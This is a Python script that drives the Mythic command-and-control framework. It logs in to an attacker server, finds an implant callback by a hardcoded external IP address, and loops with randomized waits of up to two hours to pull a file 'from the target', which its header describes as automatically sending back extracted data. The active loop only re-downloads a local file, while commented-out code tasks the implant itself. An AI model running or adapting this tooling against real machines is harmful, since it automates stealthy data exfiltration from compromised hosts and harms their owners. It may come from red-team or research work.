'''
 # @ Author: Newt Tan
 # @ Create Time: 2025-01-04 12:44:57
 # @ Modified by: Newt Tan
 # @ Modified time: 2025-01-04 12:46:37
 # @ Description: automatically send back extracted data
 '''

import gql
from mythic import mythic
from dotenv import load_dotenv
from pathlib import Path
import os
import time
import random
import asyncio
from utils import util

load_dotenv()

random.seed(43)

# when move to custom place, need to change the path to locate logs folder
logger = util.create_logger(Path.cwd().parent.parent.joinpath("logs", Path(__file__).name))


class MythicHelper:
    def __init__(self,):
        self.mythic = None
    
    async def async_init(self):
        try:
            

            self.mythic = await mythic.login(
                username=os.getenv("ADMIN_USERNAME"),
                password=os.getenv("PASSWORD"),
                server_ip=os.getenv("ATTACK_IP"),
                server_port=7443,
                ssl=True,
                timeout=-1
            )

            logger.info("Login successful.")
        except gql.transport.exceptions.TransportQueryError as e:
            logger.error(f"TransportQueryError: {e}")
            logger.error("Ensure the credentials are correct and the user has the required permissions.")
            raise
        except Exception as e:
            logger.error(f"Authentication failed: {e}")
            raise

    async def locate_callback(self, match_key, match_value):
        ''' automatically locate the callback by matching specific key-value pairs

        :param match_key: attribute to match (e.g 'id' 'domain' 'ip')
        :param match_value: vlaue to match for the attribute
        :return: callback dictionary or None if not found
        
        '''
        callbacks = await mythic.get_all_callbacks(self.mythic)
  
        for callback in callbacks:
            if callback.get(match_key) == match_value:
                logger.info(f"Found callback: {callback}")
                return callback
        
        logger.info(f"No callback matching {match_key} = {match_value} found.")
        return None

    
    async def down_send_file(self, callback_id:int, file_path:Path, \
                             min_interval=60, max_interval=7200):
        ''' periodically send a command to download a specific file from the target

        :param callback_id: Id of the callback to task
        :param file_path: Path to the file to download
        '''
        while True:
            try:
                # register a file
                resp = await mythic.register_file(
                    mythic=self.mythic,
                    filename=file_path.name,
                    contents=file_path.open("rb").read()
                )

                # download a file without chunking
                file_types = await mythic.download_file(mythic=self.mythic, file_uuid=resp)
                with open(Path(file_path).name, 'wb') as fw:
                    fw.write(file_types)
                logger.info(f"File {file_path} successfully downloaded. ")
                print(file_types)
                # # task = self.mythic.create_task(callback_id, command="download", params=file_path)
                # status = mythic.issue_task(self.mythic, command_name="download", callback_display_id=callback_id, \
                #                          parameters=file_path)
                # logger.info(f"Task sent for downloading {file_path} by issuing a task: {status}")

                # # monitor task results
                # while True:
                #     task_info = self.mythic.get_task_status(task['id'])
                #     task_status = task_info.get("status", "unknown")
                #     logger.info(f"Task {task['id']} status: {task_status}")

                #     if task_status == "completed":
                #         # save downloaded file
                #         file_id = task_info['response'].get("file_id")
                #         if file_id:
                #             file_content = self.mythic.download_file(file_id)
                #             with open(Path(file_path).name, 'wb') as fw:
                #                 fw.write(file_content)
                #             logger.info(f"File {file_path} successfully downloaded. ")
                #         break
                #     elif task_status == "error":
                #         logger.warn(f"Task {task['id']} encountered an error.")
                #         break
                #     else:
                #         # wait before polling again
                #         time.sleep(10)
                
                # wait for a random interval before reissuing the task
                wait_time = random.randint(min_interval, max_interval)
                logger.info(f"Waiting for {wait_time} seconds before issuing the next download")
                time.sleep(wait_time)
            
            except Exception as e:
                logger.warn(f"An error occurred during download process: {e}")
                pass
                    
async def main():
    helper = MythicHelper()
    await helper.async_init()  # Initialize and log in

    external_ip = "51.143.216.192"
    callback = await helper.locate_callback("external_ip", external_ip)
    if callback:
        callback_id = callback['id']
        # Default saved location --- current folder
        file_path = Path.cwd().joinpath("system_info.json")

        await helper.down_send_file(callback_id, file_path, min_interval=60, max_interval=7200)


if __name__ == "__main__":
    asyncio.run(main())
